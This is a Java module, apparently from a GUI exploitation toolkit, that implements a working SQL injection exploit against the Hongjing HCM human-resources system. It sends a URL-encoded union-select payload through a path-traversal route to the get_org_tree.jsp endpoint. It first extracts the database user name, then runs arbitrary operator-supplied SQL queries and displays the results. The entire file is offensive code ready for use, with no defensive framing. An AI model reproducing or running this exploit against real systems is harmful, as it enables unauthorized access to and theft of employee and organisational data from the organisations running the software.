package exp.oa.hongjingoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import decrypt.code.getAllEncode;
import utils.getIndexOf;

import java.util.HashMap;

public class hongjing_hcm_getorgtree_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String HCMPayload(String sql){
        String var0 = "1=0 union select 1,"+sql+",'hjsoft',4--+";
        String var1 = getAllEncode.getAllUrlEncode(var0, "all");
        return "params="+var1;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap head = new HashMap();
            Response post = HttpTools.post(url + "/templates/attestation/../../kq/app_check_in/get_org_tree.jsp", HCMPayload("user_name()"), head, "utf-8");
            if (post.getText().contains("text=\"hjsoft") && post.getCode() == 200) {
                String getT = post.getText();
                String var = getIndexOf.getMessage(getT,"organization\">",32,"text=\"hjsoft",-2);
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongjing_hcm_getorgtree_sqli ]");
                    textArea.appendText("\n sql注入利用成功,注入方法union联合注入");
                    textArea.appendText("\n CMD处输入mssql字段测试");
                    textArea_cmd.appendText("\n" + var);
                    textArea.appendText("\n ");
                });
                return true;
            } else {
            Platform.runLater(() -> {
                textArea.appendText("\n ");
            });
            return false;
            }
        }catch (Exception E){
            return false;
        }
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap head = new HashMap();
            Response post = HttpTools.post(url + "/templates/attestation/../../kq/app_check_in/get_org_tree.jsp", HCMPayload(sql), head, "utf-8");
            if (post.getText().contains("text=\"hjsoft") && post.getCode() == 200) {
                String getT = post.getText();
                String var = getIndexOf.getMessage(getT, "organization\">", 32, "text=\"hjsoft", -2);
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入成功");
                    textArea_cmd.appendText("\n" + var);
                    textArea.appendText("\n ");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入失败");
                    textArea.appendText("\n ");
                });
                return false;
            }
        }catch (Exception E){
            return false;
        }
    }

}

